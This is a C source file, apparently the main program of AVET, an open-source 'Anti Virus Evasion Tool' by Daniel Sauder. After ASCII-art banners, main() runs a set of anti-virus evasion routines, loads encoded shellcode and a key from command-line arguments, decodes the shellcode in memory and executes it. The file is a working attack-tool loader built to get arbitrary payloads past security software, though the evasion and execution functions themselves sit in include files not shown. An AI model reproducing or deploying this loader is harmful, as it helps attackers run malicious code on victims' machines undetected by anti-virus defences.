/*
Author: Daniel Sauder
License: https://www.gnu.org/licenses/gpl.txt or LICENSE file
Web: https://github.com/govolution/avet
*/

//     "         .==,_                                          \n"
//     "        .===,_`\\                                        \n"
//     "      .====,_ ` \\      .====,__                         \n"
//     "---     .==-,`~. \\           `:`.__,                    \n"
//     " ---      `~~=-.  \\           /^^^     MEEP MEEP        \n"
//     "   ---       `~~=. \\         /                          \n"
//     "                `~. \\       /                           \n"
//     "                  ~. \\____./                            \n"
//     "                    `.=====)                            \n"
//     "                 ___.--~~~--.__                         \n"
//     "       ___\\.--~~~              ~~~---.._|/              \n"
//     "       ~~~\\\"                             /              \n"

//     " ________  ___      ___ _______  _________  \n" 
//     "|\\   __  \\|\\  \\    /  /|\\  ___ \\|\\___   ___\\ \n"
//     "\\ \\  \\|\\  \\ \\  \\  /  / | \\   __/\\|___ \\  \\_| \n"
//     " \\ \\   __  \\ \\  \\/  / / \\ \\  \\_|/__  \\ \\  \\  \n"
//     "  \\ \\  \\ \\  \\ \\    / /   \\ \\  \\_|\\ \\  \\ \\  \\ \n"
//     "   \\ \\__\\ \\__\\ \\__/ /     \\ \\_______\\  \\ \\__\\\n"
//     "    \\|__|\\|__|\\|__|/       \\|_______|   \\|__|\n"
//         "\n\nAnti Virus Evasion Tool by Daniel Sauder\n"


#include <stdio.h>

// Include debug_print macro, if set.
#include "debug_print/debug_print.include"

// Include implementation files needed for the selected functions.
// The included files are assembled by the build script, in which functions are selected.
#include "evasion/evasion.include"
#include "get_shellcode/get_shellcode.include"
#include "get_key/get_key.include"
#include "decode_shellcode/decode_shellcode.include"
#include "bind_shellcode/bind_shellcode.include"


// Set how many evasion functions can be used at maximum
#define EVASION_ARRAY_SIZE 10


int main (int argc, char **argv)
{		
	// Function prototype pointers to store selected functions.	
	unsigned char *(*get_shellcode) (char *arg1, int *shellcode_size) = NULL;
	unsigned char *(*get_key) (char *arg1, int *key_length) = NULL;
	void (*decode_shellcode) (const unsigned char *ciphertext, const int ciphertext_length, const unsigned char *key, const int key_length, unsigned char *plaintext) = NULL;
	void (*bind_shellcode) (unsigned char *shellcode) = NULL;
	
	// Define array to store multiple evasion functions.
	// Set static array size of 10 because dynamic size handling in cooperation with build scripts would be too messy.
	// The included evasion.assign file will take care of populating the array.
	typedef void (*evasion_function) (char *arg1);
	evasion_function evasion_functions[EVASION_ARRAY_SIZE]; 
	// NULL the array to make later checks succeed
	for(int i = 0; i < EVASION_ARRAY_SIZE; i++) {
		evasion_functions[i] = NULL;
	}
		
	// Assign selected functions to prototypes
	// Included assignment code is assembled by the build script
	#include "evasion/evasion.assign"
	#include "get_shellcode/get_shellcode.assign"
	#include "get_key/get_key.assign"
	#include "decode_shellcode/decode_shellcode.assign"
	#include "bind_shellcode/bind_shellcode.assign"
		
	// Execute evasion functions
	for(int i = 0; i < EVASION_ARRAY_SIZE; i++) {
		if(evasion_functions[i] != NULL) {			
			evasion_functions[i]("");
		}
	}	
	
	// Retrieve encoded shellcode
	int shellcode_size = 0;
	unsigned char *encoded_shellcode = get_shellcode(argv[1], &shellcode_size);
	
	// Retrieve crypto key
	int key_length = 0;
	unsigned char *key = get_key(argv[2], &key_length);
	
	// Decode shellcode
	unsigned char* shellcode = (unsigned char *) malloc(shellcode_size);
	decode_shellcode(encoded_shellcode, shellcode_size, key, key_length, shellcode);
	
	// Bind and execute shellcode
	bind_shellcode(shellcode);
	
	return 0;
}